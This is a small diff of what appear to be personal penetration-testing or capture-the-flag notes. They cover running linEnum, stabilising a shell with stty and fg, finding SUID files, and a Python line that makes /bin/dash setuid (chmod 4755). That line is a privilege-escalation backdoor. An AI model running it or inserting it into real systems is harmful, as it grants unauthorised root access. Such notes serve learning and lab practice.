@@ -20,8 +20,8 @@ linEnum -t
 
 to edit the file ^Z to background the shell.
 
-now `stty raw -echo`
+now `stty raw -echo` then `fg` the shell then `reset` (you wont see anything text)
 
 find suid files `find / -perm -u=s -type f 2>/dev/null`
 
-os.system('chmod 4755 /bin/dash')
+`os.system('chmod 4755 /bin/dash')`
